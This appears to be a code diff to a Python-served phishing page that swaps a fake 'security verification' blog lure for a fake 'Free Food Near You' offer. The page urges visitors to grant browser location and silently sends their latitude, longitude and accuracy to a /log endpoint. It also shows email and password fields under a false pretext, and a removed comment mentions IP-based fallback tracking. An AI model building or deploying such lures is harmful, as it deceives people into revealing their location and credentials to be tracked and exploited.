@@ -4,38 +4,44 @@ import requests
 import urllib.parse as urlparse
 from user_agents import parse
 
-# HTML for the fake sign-in blog page with popup
+# HTML for the fake "Free Food Finder" site
 html = """
 <html>
 <head>
-    <title>My Everyday Blog</title>
+    <title>Free Food Near You</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #f9f9f9; }
-        .container { background: #fff; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
-        button { padding: 10px 20px; background: #4285f4; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
-        button:hover { background: #3367d6; }
-        .footer { margin-top: 30px; font-size: 12px; color: gray; }
+        body { font-family: Arial; background: #fff8f0; margin: 0; padding: 0; }
+        header { background: #ff7043; color: white; padding: 20px; font-size: 24px; text-align: center; }
+        .container { text-align: center; padding: 30px; }
+        .container h2 { color: #ff7043; }
+        .info { color: #333; font-size: 16px; margin-bottom: 20px; }
+        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { padding: 10px 20px; background: #ff7043; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #e64a19; }
+        .footer { margin-top: 30px; font-size: 12px; color: gray; text-align: center; }
         #overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:999; }
         #popup { background:#fff; padding:20px; border-radius:8px; width:80%; max-width:300px; text-align:center; }
         #popup button { background:#28a745; color:white; padding:10px; border:none; border-radius:4px; cursor:pointer; margin-top:15px; }
     </style>
 </head>
 <body>
+    <header>Free Food Near You!</header>
+
     <div id="overlay">
         <div id="popup">
-            <h3>Security Verification</h3>
-            <p>To continue using My Everyday Blog, please verify your location.</p>
+            <h3>Find Free Food Nearby</h3>
+            <p>Restaurants & fast food chains near you are giving away surplus food they didn’t sell today. Allow location to see offers near you.</p>
             <button onclick="getLocation()">Allow Access</button>
         </div>
     </div>
 
     <div class="container">
-        <h2>Sign in to My Everyday Blog</h2>
+        <h2>Sign in to Claim Free Food</h2>
+        <p class="info">Enter your email to see available offers.</p>
         <input type="text" placeholder="Email">
         <input type="password" placeholder="Password">
-        <button>Sign In</button>
-        <p id="status" style="margin-top:15px; color:gray;">Waiting for verification...</p>
+        <button>See Offers</button>
+        <p id="status" style="margin-top:15px; color:gray;">Waiting for location verification...</p>
     </div>
     <p class="footer">Created by <b>kchiong</b></p>
 
@@ -56,13 +62,12 @@ html = """
 
             // Send coordinates to server
             fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
-            document.getElementById("status").innerText = "Verified. Loading...";
+            document.getElementById("status").innerText = "Verified! Loading offers...";
             document.getElementById("overlay").style.display = "none";
         }
 
         function error() {
-            // If denied, still allow browsing (server will use IP fallback)
-            document.getElementById("status").innerText = "Location access denied. Using default verification.";
+            document.getElementById("status").innerText = "Location access denied. Showing default offers.";
             document.getElementById("overlay").style.display = "none";
         }
     </script>
